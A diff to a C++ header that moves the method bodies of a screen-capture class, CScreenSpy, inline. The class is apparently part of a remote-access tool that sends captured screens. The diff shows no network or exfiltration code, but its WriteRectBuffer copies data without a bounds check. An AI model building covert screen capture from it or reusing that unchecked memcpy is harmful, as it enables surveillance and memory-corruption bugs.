@@ -18,8 +18,19 @@ class CScreenSpy
 public:
 	CScreenSpy(ULONG ulbiBitCount);
 	virtual ~CScreenSpy();
-	ULONG GetBISize(); 
-	LPBITMAPINFO GetBIData();
+
+	ULONG GetBISize() const
+	{
+		ULONG	ColorNum = m_ulbiBitCount <= 8 ? 1 << m_ulbiBitCount : 0;
+
+		return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
+	}
+
+	const LPBITMAPINFO& GetBIData() const
+	{
+		return m_BitmapInfor_Full;
+	}
+
 	ULONG  m_ulbiBitCount;
 	LPBITMAPINFO m_BitmapInfor_Full;
 	ULONG  m_ulFullWidth, m_ulFullHeight;               //ÆÁÄ»µÄ·Ö±æÂÊ
@@ -33,12 +44,23 @@ public:
 	PVOID   m_BitmapData_Full;
 	DWORD  m_dwBitBltRop;
 	LPVOID GetFirstScreenData();
-	ULONG GetFirstScreenLength();
+
+	ULONG GetFirstScreenLength() const
+	{
+		return m_BitmapInfor_Full->bmiHeader.biSizeImage;
+	}
+
 	LPVOID GetNextScreenData(ULONG* ulNextSendLength);
 	BYTE* m_RectBuffer;
 	ULONG m_RectBufferOffset;
 	BYTE   m_bAlgorithm;
-	VOID WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength);
+
+	FORCEINLINE VOID WriteRectBuffer(LPBYTE szBuffer,ULONG ulLength)
+	{
+		memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);   
+		m_RectBufferOffset += ulLength;
+	}
+
 	CCursorInfor m_CursorInfor;
 	HDC  m_hDiffMemDC;
 	HBITMAP	m_DiffBitmapHandle;
